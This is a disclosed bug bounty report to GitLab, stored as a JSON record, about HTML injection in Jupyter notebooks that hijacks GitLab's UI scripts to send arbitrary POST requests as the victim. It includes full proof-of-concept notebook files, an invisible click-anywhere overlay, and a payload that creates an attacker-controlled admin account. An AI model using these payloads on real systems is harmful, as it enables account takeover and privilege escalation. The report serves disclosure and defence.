{
  "reported_to": "GitLab",
  "reported_by": "joaxcar ",
  "title": "Arbitrary POST request as victim user from HTML injection in Jupyter notebooks",
  "content": "\nSummary\nAn attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user. In the \"worst case\" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.\nThis research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.\nThe script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.\nCode 308 Bytes\n1function deferredInitialisation() {\n2  const $body = $('body');\n3\n4  initTopNav();\n5  initBreadcrumbs();\n6  initTodoToggle();\n7  initLogoAnimation();\n8  initServicePingConsent();\n9  initUserPopovers();\n10  initBroadcastNotifications();\n11  initPersistentUserCallouts();\n12  initDefaultTrackers();\n13  initFeatureHighlight();\nReading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.\nAs an example we have persistent_user_callout in\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js\nwhere a POST request is made like\nCode 166 Bytes\n1dismiss(event, deferredLinkOptions = null) {\n2    event.preventDefault();\n3\n4    axios\n5      .post(this.dismissEndpoint, {\n6        feature_name: this.featureId,\n7      })\nthe dissmissEndpoint is controllable through a data attribute data-dissmiss-endpoint. The data attributes are extracted like so\nCode 342 Bytes\n1export default class PersistentUserCallout {\n2  constructor(container, options = container.dataset) {\n3    const { dismissEndpoint, featureId, deferLinks } = options;\n4    this.container = container;\n5    this.dismissEndpoint = dismissEndpoint;\n6    this.featureId = featureId;\n7    this.deferLinks = parseBoolean(deferLinks);\n8\n9    this.init();\n10  }\nTo be able to fire the dismiss function (and thus the POST request) we also need a js-close button\nCode 62 Bytes\n1const closeButton = this.container.querySelector('.js-close');\nThe HTML needed to set this up is\nCode 398 Bytes\n1<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\">\n2    <button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">\n3        hack\n4    </button>\n5</div>\nThe styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.\nNow to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.\nA file like this will do as a simple POC\nCode 1.38 KiB\n1{\n2  \"cells\": [\n3    {\n4      \"metadata\": { \"trusted\": true },\n5      \"cell_type\": \"code\",\n6      \"source\": \"<h1>asd</h1>\",\n7      \"execution_count\": 1,\n8      \"outputs\": [\n9        {\n10          \"output_type\": \"display_data\",\n11          \"data\": {\n12            \"text/plain\": \"<IPython.core.display.HTML object>\",\n13            \"text/html\": \"<div class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\">asdf</div>\\n<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"><button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">hack</button></div>\\n\"\n14          },\n15          \"metadata\": {}\n16        }\n17      ]\n18    }\n19  ],\n20  \"metadata\": {\n21    \"kernelspec\": {\n22      \"name\": \"python3\",\n23      \"display_name\": \"Python 3\",\n24      \"language\": \"python\"\n25    },\n26    \"language_info\": {\n27      \"name\": \"python\",\n28      \"version\": \"3.7.8\",\n29      \"mimetype\": \"text/x-python\",\n30      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n31      \"pygments_lexer\": \"ipython3\",\n32      \"nbconvert_exporter\": \"python\",\n33      \"file_extension\": \".py\"\n34    }\n35  },\n36  \"nbformat\": 4,\n37  \"nbformat_minor\": 4\n38}\nI have added a feature-highlight (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload \"load up\" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.\n<image_0>\nVisiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one\nCode 461 Bytes\n1\"text/html\": \"<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/users?admin=true&email=joaxcarte01@wearehackerone.com&name=just&username=just&password=asdasdasdasd\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"><button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">.</button></div>\\n\"}\nA visit by an admin to this site would end up with a new admin account being created.\nFinally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.\nSteps to reproduce\nCreate a project on GitLab.com\nCreate a new file named hack.ipynb (or upload the included file) with the content hack.ipynb (F1525030)\nCode 1.38 KiB\n1{\n2  \"cells\": [\n3    {\n4      \"metadata\": { \"trusted\": true },\n5      \"cell_type\": \"code\",\n6      \"source\": \"<h1>asd</h1>\",\n7      \"execution_count\": 1,\n8      \"outputs\": [\n9        {\n10          \"output_type\": \"display_data\",\n11          \"data\": {\n12            \"text/plain\": \"<IPython.core.display.HTML object>\",\n13            \"text/html\": \"<div class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\">asdf</div>\\n<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"><button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">hack</button></div>\\n\"\n14          },\n15          \"metadata\": {}\n16        }\n17      ]\n18    }\n19  ],\n20  \"metadata\": {\n21    \"kernelspec\": {\n22      \"name\": \"python3\",\n23      \"display_name\": \"Python 3\",\n24      \"language\": \"python\"\n25    },\n26    \"language_info\": {\n27      \"name\": \"python\",\n28      \"version\": \"3.7.8\",\n29      \"mimetype\": \"text/x-python\",\n30      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n31      \"pygments_lexer\": \"ipython3\",\n32      \"nbconvert_exporter\": \"python\",\n33      \"file_extension\": \".py\"\n34    }\n35  },\n36  \"nbformat\": 4,\n37  \"nbformat_minor\": 4\n38}\nClick save\nAfter saving you will land on the preview page for the file. If the out block does not contain a blue dot, refresh this page.\nWhen the dot is blue click anywhere on the page\nNow go to https://gitlab.com/dashboard/todos and check that a todo have been added\nvideo example of the POC (note the todo being empty and the blue dot):\n\u2588\u2588\u2588\u2588\u2588\nImpact\nAn attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.\nExamples\nPrivate project:\nhttps://gitlab.com/parent02/sub2/asd/-/blob/main/hack.ipynb\nWhat is the current bug behavior?\nDOMPurify does not filter out arbitrary data-* attributes, making it possible to high jack Gitlab UI JavaScript to make POST requests\nWhat is the expected correct behavior?\nThe attributes should not work in Jupyter notebooks\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nAn attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.\n\n",
  "severity": [
    7.7,
    null
  ],
  "bounty": 8690,
  "weaknesses": [
    "Resource Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ys8u33tr2wlbli3fmelx49x84wam?response-content-disposition=attachment%3B%20filename%3D%22dot.png%22%3B%20filename%2A%3DUTF-8%27%27dot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXBZLYPGW%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T024841Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCrDxTF7Mabv0Hs4C4yvyHSGPa4F%2BG2rvDGGB6SdftNFAIgGPAdmbMafS%2BmsCnog2b5eIlEBiY%2BzLRabAE%2FzjbveR0quwUI%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHKw51qGe2u7y2L2SCqPBQDJzeWKgFK%2FGL%2FfFG7srJSP%2B%2FzQic%2B66ptMwjLqlxZ8rnjaaZy5XV8E1UKVpTHUZD1CG7drGrBny%2Bgc%2FCA8eLE1KwGNWoT2UgdTn8VW7hFXd%2B%2FzK5ej%2BWVQ4n7B3am4OD3LXV9d96ANe%2F13o9J899SFAX1V4gHanyLQmcKuVb7rPouYaOARCnHMyVHD0lm%2F0JHDQKzphlqcUh3HkSV8l%2BVKgpHx1J1Efz%2Bk%2BjMPtcwKUMzSNC6vjWfilyGysixrt%2FpT7JXQOpbwkgW%2F9vn1%2FRucN%2Bi1ptnuqEqggpRkP12DppvAvi1gI8qAFmHxNhY%2FLtFYif0%2BWKf8GZvU9skcEM7ihnMH1K1kZFvNplf8fCObaEFVjIrJqKMB45S%2BOQ4NBtovo%2F1UVhgCqhU9R67ObQHNgsutDgkKnST3mL%2BcCl%2BHi1Ivw94HWjGn%2B1kamdJ6bir5aDp6EC8yZP86uOOlEdLODfkgv47iY0UY1aJ6JtLxm1koAqjN56IC%2BigBW3Chiuxrw83fnDI2nuNrksx9LRfvN2Uz2tzNPe559TK5kFqz19g8wOfM5gkO%2BIu9y7gp1MBJgsM3FqciBy9OJ7isGT%2FV4ujE84ViTBwwYttoyoTy9484sT7Kec9l%2FsARMN2thg1PsRcBXRhEpCUTHbtKkegs1G%2Fh%2BNlXWj0xE3gS6%2Bq9OGeXg%2Brz%2BifsiXhyxQ6Z8YgQujsrRg5%2B66EYr22fxQTu20xBjRu4guSngGhGYkfg3x30Cj8zt7WearvIOslfkBIMKD0xrLouZfeSHxqWYg86VsOgfakoELVJrYIo3EPy3Y8AjiL8BGfhD4BgJ6R5%2BuPWZP4SXrWTCpqWQZYAJrC5g4IGwVjzYQfnoQEfcDUwyoyIvwY6sQHKtqXuT3g5qvSErCLhPrWSEQdvdJJnOuicjh5Ni0wI8EZ0e4dHr5hIF1wghmT451XXbmRxK3ZZXhcWn4%2FKslM89MHm1sKoehXj3h6o33FfsxwzeFsbNCiq1WcXjKWjYrLAfW6968Ov%2FPqf9zNDmhyRWqEoUWkRCIzxEPWlI5abWs2QdUiUCq556DPfu5ptdgaLs8m%2B4bElXd0NGkVb2xq1Xz5w6MeJaxEV7nPvEkhdCrU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6a4f4e6afa8a43ca3df21fc548a1dbdc72071b8c48a5d17a4880f898c5ed12ae"
  },
  "disclosed_date": 1653071520,
  "report_url": "https://hackerone.com/reports/1409788",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a Jupyter notebook file with malicious HTML content that includes specific data attributes and classes to trigger POST requests when viewed."
    ],
    [
      2,
      "Upload the notebook to GitLab and have a victim user (potentially an admin) view the notebook, causing arbitrary POST requests to be made on their behalf."
    ]
  ],
  "vuln_description": "An attacker can create a Jupyter notebook with HTML that, when viewed by another user (including admins), triggers arbitrary POST requests as the victim user. This can lead to actions like creating new admin accounts or modifying project settings without the victim's consent.",
  "reason": "The vulnerability requires understanding of GitLab's JavaScript initialization routines, specific data attributes that trigger POST requests, and how to bypass DOMPurify's sanitization. The attacker must also craft the HTML to include the correct classes and attributes to hook into GitLab's UI JavaScript.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves making arbitrary POST requests through HTML injection in Jupyter notebooks, which leverages existing GitLab UI JavaScript functionality. The methodology described involves testing for authorization boundaries by swapping user sessions and resource IDs, which would include testing for unauthorized POST requests triggered by HTML elements with specific data attributes. Since the attack relies on existing UI functionality and data attributes that are not properly sanitized, it falls within the scope of the described detection methods, particularly parts b) and e) which involve executing actions with different user sessions and resource IDs.",
    "is_detectable": true
  }
}